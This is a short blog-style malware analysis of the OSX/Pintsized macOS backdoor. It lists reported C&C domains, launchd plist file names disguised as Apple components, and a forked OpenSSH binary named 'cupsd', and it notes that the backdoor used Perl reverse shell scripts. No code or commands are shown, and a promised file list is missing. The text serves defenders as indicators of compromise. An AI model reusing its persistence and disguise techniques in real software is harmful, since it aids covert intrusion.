In complement to my blog post regarding , you will find here under some additional
informations regarding OSX/Pintsized, the backdoor used to in these attacks.
OSX/Pintsized backdoor was initially described by Intego, the 19 February, with some
details. At the time of Intego post, all of the C&C components were sinkholed to
Shadowserver. The backdoor was composed of clear text reverse shell perl scripts,
executed a regular interval, and by a forked version of OpenSSH named “cupsd“. A RSA key
was embedded in the forked OpenSSH, reported domain name of C&C was “corp-aapl.com”
and reported file names were:
com.apple.cocoa.plist
cupsd (Mach-O binary)
com.apple.cupsd.plist
com.apple.cups.plist
com.apple.env.plist
F-Secure also reported, the 19 February, some additional C&C servers “cloudboxstorage.com” and “digitalinsight-ltd.com“. Symantec reported some additional details on the
C&C domain names “cache.cloudbox-storage.com“, “img.digitalinsight-ltd.com” and
“pop.digitalinsight-ltd.com“, and also reported the storage location of the forked version of
OpenSSH “/Users/[USER NAME]/.cups/cupsd“.
By doing an analysis of OSX/Pintsized I can provide the following additional informations:
All files, targeting OSX, were controlled by launchd daemon through launchd.plist
configuration files. Here under the list of all known launchd configuration files.

If you take a look at all the domain names sinkholed to Shadowserver, you will see
additional domain names.
